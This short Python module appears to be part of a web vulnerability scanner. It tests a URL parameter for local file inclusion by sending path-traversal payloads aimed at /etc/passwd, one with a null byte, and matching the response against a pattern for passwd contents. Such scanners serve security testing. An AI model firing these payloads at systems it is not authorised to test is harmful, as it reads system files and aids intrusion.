# scanner/lfi.py
import requests
import re

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../etc/passwd%00",
    "/etc/passwd"
]

LFI_INDICATORS = re.compile(r"root:.*:0:0:|/bin/bash|/bin/sh|/etc/passwd", re.IGNORECASE)

def test_lfi_on_param(url, param_name, session=None, timeout=8):
    """
    Basic LFI checks by injecting common LFI payloads into a parameter (GET).
    Returns finding dict if evidence found.
    """
    s = session or requests.Session()
    try:
        # Try each payload
        for payload in LFI_PAYLOADS:
            params = {param_name: payload}
            r = s.get(url, params=params, timeout=timeout)
            if LFI_INDICATORS.search(r.text):
                return {
                    "param": param_name,
                    "payload": payload,
                    "evidence": r.text[:1000]
                }
    except Exception:
        return None
    return None
